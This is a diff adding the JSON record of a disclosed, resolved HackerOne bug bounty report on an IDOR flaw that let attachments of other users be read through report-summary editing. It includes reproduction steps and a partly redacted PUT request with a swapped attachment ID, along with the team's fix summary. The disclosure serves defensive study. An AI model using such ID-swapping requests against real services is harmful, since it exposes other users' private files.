@@ -1,0 +1,184 @@
+{
+  "id": 2442008,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDQyMDA4",
+  "url": "https://hackerone.com/reports/2442008",
+  "title": "Attachment disclosure via summary report ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-03-30T17:35:18.529Z",
+  "submitted_at": "2024-03-30T17:53:08.294Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "xklepxn",
+    "url": "/xklepxn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/rBc1ZswDaHjk8U1hgGMgDfj8/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-04-29T04:32:57.476Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-04-24T02:18:55.417Z",
+  "team_member_agreed_on_going_public_at": "2024-04-29T04:32:57.111Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nHackerone provides a form for reporting vulnerabilities to various programs. where the form supports uploading files & previews (images or videos) but is not allowed to use file ids belonging to other accounts. but with the sumary report feature I as a hacker can reveal files belonging to other users just changing the id. this is very severe.\n\n\n**Description:**\n\nI have tried to call files belonging to other accounts through the submit report, edit report form but it doesn't work it always gets the response ```\"was_successful\":false,```. but fortunately I can find another endpoint that is able to read files belonging to other accounts, namely in the sumary report feature.\n\n### Steps To Reproduce\nIf you look at the video I attached, there I made the scenario \"failed to read other account files\" & \"successfully read other account files\" as for the steps as follows:\nnote : left victim right attacker\n\n1. the attacker creates a report either draft or existing, then creates a Hacker summary \n2. then edit the summary and give the file to. \n3. intercept with intercept change the attacker file id to the victim file id\n4. boom file read in markdown preview.\n\n{F3155289}\n\n### POC \nI don't know, uploading large files takes too long in attacth, I just put the poc via yt. : https://████ (private video)\nor in gdrive, if yt can't be seen yet  : https://███████\n\n### Optional: Supporting Material/References (Screenshots)\n\n####raw text in video :\n```\nattachment leaked via add sumary report :\n\nvictim file id : \n3155239\n\nI WILL CHANGE F3155244 TO 3155239\nATTACKER file : \n\n3155241\n3155242\n\"was_successful\":true, (IF FILE FROM ATTACKER) I WILL CHANGE TO VICTIM FILE\n\"was_successful\":false, WILL FALSE \n\ntrying leak via content : false positive\nleak via sumary : successful\n```\n#### endpoint affected  (attachment_ids)\n\n```\nPUT /reports/████/summaries/███████ HTTP/2\nHost: hackerone.com\n.....all header ...\nContent-Length: 908\nOrigin: https://hackerone.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\n{\"id\":████████,\"category\":\"researcher\",\"content\":\"TESTEDIT\\n\\n{F3155244} \",\"updated_at\":\"2024-03-30T17:16:29.625Z\",\"user\":{\"id\":█████,\"username\":\"█████\",\"name\":\"██████████████\",\"bio\":\"please see pdfx\",\"cleared\":false,\"verified\":false,\"website\":null,\"location\":\"\",\"created_at\":\"2024-03-29T11:27:50.077Z\",\"url\":\"https://hackerone.com/██████████\",\"hackerone_triager\":false,\"hackerone_employee\":false,\"user_type\":\"hacker\",\"profile_picture_urls\":{\"small\":\"/assets/avatars/default-█████.png\",\"medium\":\"/assets/avatars/default-███████.png\",\"xtralarge\":\"/assets/avatars/default-███████.png\"}},\"can_view?\":true,\"can_create?\":true,\"attachments\":[],\"action_type\":\"publish\",\"attachment_ids\":[\n3155239]}\n```\n\n## Impact\n\nThis is very bad especially the id form is only numeric in order. I can just add all the file ids of the hackerone account. I can see other people's pocs if it's a video.",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-05-24T02:18:55.609Z",
+  "allow_singular_disclosure_after": -61821938.336495325,
+  "singular_disclosure_allowed": true,
+  "vote_count": 332,
+  "voters": [
+    "buraaqsec",
+    "selmelc",
+    "mr-medi",
+    "n4tur3_",
+    "0xcyborg",
+    "ragingg",
+    "orange303",
+    "0xtarun",
+    "tinmo",
+    "mrizzz",
+    "and 322 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 426518,
+      "category": "team",
+      "content": "A critical vulnerability was discovered in the HackerOne platform that allowed an attacker to gain unauthorized access to attachments belonging to other users through the report summary editing functionality. By manipulating attachment IDs in the request, an attacker could view sensitive files that should have been restricted. The core issue was an Insecure Direct Object Reference (IDOR) vulnerability (CWE-639) where attachment access was not properly validated across user accounts when editing summary reports. This posed a serious risk to the confidentiality of user data and could lead to disclosure of sensitive attack details and exploitation information and also loss of it.\n\nFortunately, this vulnerability was responsibly disclosed through our bug bounty program and remediated before it could be maliciously exploited or cause any data exposure.\n\nUpon validation, the HackerOne team promptly implemented a fix to correctly validate attachment IDs and prevent unauthorized cross-user access via summary report editing.\n\nHackerOne maintains a strong commitment to security and transparency. We are grateful to the ethical hacker community for their invaluable contributions in identifying vulnerabilities before malicious exploitation can occur.",
+      "updated_at": "2024-04-04T11:06:25.397Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 895662,
+        "username": "0daybookworm",
+        "name": "n a",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2020-01-06T10:17:31.291Z",
+        "url": "https://hackerone.com/0daybookworm",
+        "hackerone_triager": false,
+        "hackerone_employee": true,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/5eifd75ua7wffxf9610xxyt04pwk/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/5eifd75ua7wffxf9610xxyt04pwk/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5eifd75ua7wffxf9610xxyt04pwk/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "id": 437535,
+      "category": "researcher",
+      "content": "Here if you want to read the story behind me finding this vulnerability!\n\nID: https://blog.tegalsec.org/hackerone-got-hacked-how-can-i-steal-your-poc\nEN: https://medium.com/@kresec/hackerone-got-hacked-how-can-i-steal-your-poc-01a9132c5aeb\n\nWriteups are very useful for bug hunters for learning / reference material.\nFor developers: it is useful to make secure applications earlier by learning from bug hunter findings, even though you have tried but the application is getting bigger, more routes, you may miss it.\n\n .",
+      "updated_at": "2024-05-21T02:05:58.020Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 956248,
+        "username": "xklepxn",
+        "name": "",
+        "bio": "",
+        "cleared": false,
+        "verified": true,
+        "website": null,
+        "location": "",
+        "created_at": "2020-02-21T17:48:06.337Z",
+        "url": "https://hackerone.com/xklepxn",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/rBc1ZswDaHjk8U1hgGMgDfj8/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/rBc1ZswDaHjk8U1hgGMgDfj8/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/rBc1ZswDaHjk8U1hgGMgDfj8/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
